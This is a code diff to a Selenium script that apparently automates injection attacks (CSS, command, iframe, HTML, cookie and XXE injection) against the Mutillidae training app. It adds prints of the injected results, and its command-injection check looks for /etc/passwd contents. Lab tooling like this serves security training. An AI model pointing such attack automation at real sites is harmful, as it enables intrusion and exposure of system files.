@@ -57,6 +57,9 @@ def css_injection(
         sleep(sleep_time)
         if verify_default_payload:
             element = browser.find_element(By.CLASS_NAME, "form-header")
+            print(
+                f'Changed default text colour on page to: {element.value_of_css_property("color")}'
+            )
             color = element.value_of_css_property("color")
             rgb = (
                 color.replace("rgba(", "")
@@ -89,8 +92,9 @@ def command_injection(
         browser.find_element(By.ID, "idTargetHostInput").send_keys(payload)
         browser.find_element(By.NAME, "dns-lookup-php-submit-button").click()
         sleep(sleep_time)
+        element = browser.find_element(By.XPATH, "//pre[@class='report-header']")
+        print(f'Output of the payload: {element.get_attribute("innerHTML")}')
         if verify_default_payload:
-            element = browser.find_element(By.XPATH, "//pre[@class='report-header']")
             if "Address" in element.text and "root:x:" in element.text:
                 print("Command injection succeeded")
                 return True
@@ -116,6 +120,9 @@ def frame_source_injection(
             f"http://{ip}/mutillidae/index.php?page=document-viewer.php&PathToDocument={payload}"
         )
         sleep(sleep_time)
+        print(
+            f'Injected iframe: {browser.find_element(By.XPATH, "//iframe").get_attribute("innerHTML")}'
+        )
         if verify_default_payload:
             browser.find_element(
                 By.XPATH, "//iframe[contains(@src, 'eportal.pwr.edu.pl')]"
@@ -142,6 +149,9 @@ def html_injection(
             f"http://{ip}/mutillidae/index.php?page=password-generator.php&username={payload}"
         )
         sleep(sleep_time)
+        print(
+            f'Injected html element: {browser.find_element(By.ID, "idUsernameInput").get_attribute("innerHTML")}'
+        )
         if verify_default_payload:
             browser.find_element(
                 By.XPATH,
@@ -173,6 +183,10 @@ def html_injection_via_cookie_into_phpsessid(
         updated_cookies = browser.get_cookies()
         print("Updated cookies:", updated_cookies)
         sleep(sleep_time)
+        element = browser.find_element(
+            By.XPATH, "//th[@reflectedxssexecutionpoint='1']"
+        )
+        print(f'Element including injected HTML: {element.get_attribute("innerHTML")}')
         if verify_default_payload:
             browser.find_element(By.XPATH, "//h1[text()='infected']")
             print("HTML injection via cookie injection succeeded")
@@ -342,6 +356,11 @@ def xml_external_entity_injection(
         browser.find_element(By.ID, "idXMLTextArea").send_keys(payload)
         browser.find_element(By.NAME, "xml-validator-php-submit-button").click()
         sleep(sleep_time)
+        element = browser.find_element(
+            By.XPATH,
+            "//fieldset/legend[text()='Text Content Parsed From XML']/following-sibling::div[@reflectedxssexecutionpoint='1']",
+        )
+        print(f'Output of the payload: {element.get_attribute("innerHTML")}')
         if verify_default_payload:
             element = browser.find_element(
                 By.XPATH,
